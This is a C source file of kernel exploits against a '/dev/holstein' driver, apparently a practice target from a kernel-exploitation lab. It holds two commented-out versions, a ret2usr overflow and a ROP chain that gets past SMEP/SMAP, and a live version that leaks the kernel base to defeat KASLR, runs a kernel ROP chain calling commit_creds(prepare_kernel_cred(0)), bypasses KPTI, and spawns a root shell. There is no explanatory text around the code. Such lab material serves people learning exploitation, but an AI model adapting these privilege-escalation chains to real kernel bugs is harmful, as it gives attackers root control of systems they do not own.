// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <fcntl.h>
// #include <unistd.h>

// unsigned long user_cs, user_ss, user_rsp, user_rflags;
// unsigned long prepare_kernel_cred = 0xffffffff8106e240;
// unsigned long commit_creds = 0xffffffff8106e390;

// static void win() {
//   char *argv[] = { "/bin/sh", NULL };
//   char *envp[] = { NULL };
//   puts("[+] win!");
//   execve("/bin/sh", argv, envp);
// }

// static void save_state() {
//   asm(
//       "movq %%cs, %0\n"
//       "movq %%ss, %1\n"
//       "movq %%rsp, %2\n"
//       "pushfq\n"
//       "popq %3\n"
//       : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
//       :
//       : "memory");
// }

// static void restore_state() {
//   asm volatile("swapgs ;"
//                "movq %0, 0x20(%%rsp)\t\n"
//                "movq %1, 0x18(%%rsp)\t\n"
//                "movq %2, 0x10(%%rsp)\t\n"
//                "movq %3, 0x08(%%rsp)\t\n"
//                "movq %4, 0x00(%%rsp)\t\n"
//                "iretq"
//                :
//                : "r"(user_ss),
//                  "r"(user_rsp),
//                  "r"(user_rflags),
//                  "r"(user_cs), "r"(win));
// }

// static void escalate_privilege() {
//   char* (*pkc)(int) = (void*)(prepare_kernel_cred);
//   void (*cc)(char*) = (void*)(commit_creds);
//   (*cc)((*pkc)(0));
//   restore_state();
// }

// void fatal(const char *msg) {
//   perror(msg);
//   exit(1);
// }

// int main() {
//   save_state();

//   int fd = open("/dev/holstein", O_RDWR);
//   if (fd == -1) fatal("open(\"/dev/holstein\")");

//   char buf[0x410];
//   memset(buf, 'A', 0x410);
//   *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
//   write(fd, buf, 0x410);

//   close(fd);
//   return 0;
// }

/*
SMAP and SMEP enabled
*/

// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <fcntl.h>
// #include <unistd.h>

// unsigned long user_cs, user_ss, user_rsp, user_rflags;
// #define prepare_kernel_cred 0xffffffff8106e240
// #define commit_creds        0xffffffff8106e390
// #define rop_pop_rdi               0xffffffff8127bbdc
// #define rop_pop_rcx               0xffffffff8132cdd3
// #define rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b
// #define rop_swapgs                0xffffffff8160bf7e
// #define rop_iretq                 0xffffffff810202af

// static void win() {
//   char *argv[] = { "/bin/sh", NULL };
//   char *envp[] = { NULL };
//   puts("[+] win!");
//   execve("/bin/sh", argv, envp);
// }

// static void save_state() {
//   asm(
//       "movq %%cs, %0\n"
//       "movq %%ss, %1\n"
//       "movq %%rsp, %2\n"
//       "pushfq\n"
//       "popq %3\n"
//       : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
//       :
//       : "memory");
// }

// void fatal(const char *msg) {
//   perror(msg);
//   exit(1);
// }

// int main() {
//   save_state();

//   int fd = open("/dev/holstein", O_RDWR);
//   if (fd == -1) fatal("open(\"/dev/holstein\")");

//   char buf[0x500];
//   memset(buf, 'A', 0x408);
//   unsigned long *chain = (unsigned long*)&buf[0x408];
//   *chain++ = rop_pop_rdi;
//   *chain++ = 0;
//   *chain++ = prepare_kernel_cred;
//   *chain++ = rop_pop_rcx;
//   *chain++ = 0;
//   *chain++ = rop_mov_rdi_rax_rep_movsq;
//   *chain++ = commit_creds;
//   *chain++ = rop_swapgs;
//   *chain++ = rop_iretq;
//   *chain++ = (unsigned long)&win;
//   *chain++ = user_cs;
//   *chain++ = user_rflags;
//   *chain++ = user_rsp;
//   *chain++ = user_ss;
//   write(fd, buf, (void*)chain - (void*)buf);

//   close(fd);
//   return 0;
// }
 
// With KASLR enabled
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

/*

   __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");

*/

unsigned long user_cs, user_ss, user_rsp, user_rflags;
#define prepare_kernel_cred (kbase + 0x6e240)
#define commit_creds        (kbase + 0x6e390)
#define rop_pop_rdi               (kbase + 0x27bbdc)
#define rop_pop_rcx               (kbase + 0x32cdd3)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x60c96b)
#define rop_bypass_kpti           (kbase + 0x800e26)

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  char buf[0x500];
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1) fatal("open(\"/dev/holstein\")");

  /* Leak kernel base */
  memset(buf, 'B', 0x480);
  read(fd, buf, 0x410);
  unsigned long addr_vfs_read = *(unsigned long*)&buf[0x408];
  unsigned long kbase = addr_vfs_read - (0xffffffff8113d33c-0xffffffff81000000);
  printf("[+] kbase = 0x%016lx\n", kbase);

  /* kROP */
  memset(buf, 'A', 0x408);
  unsigned long *chain = (unsigned long*)&buf[0x408];
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef; // [rdi] : rax
  *chain++ = 0xdeadbeef; // [rdi+0x8] : rdi
  *chain++ = (unsigned long)&win; // [rdi+0x10]
  *chain++ = user_cs;             // [rdi+0x18]
  *chain++ = user_rflags;         // [rdi+0x20]
  *chain++ = user_rsp;            // [rdi+0x28]
  *chain++ = user_ss;             // [rdi+0x30]
  write(fd, buf, (void*)chain - (void*)buf);

  close(fd);
  return 0;
}
 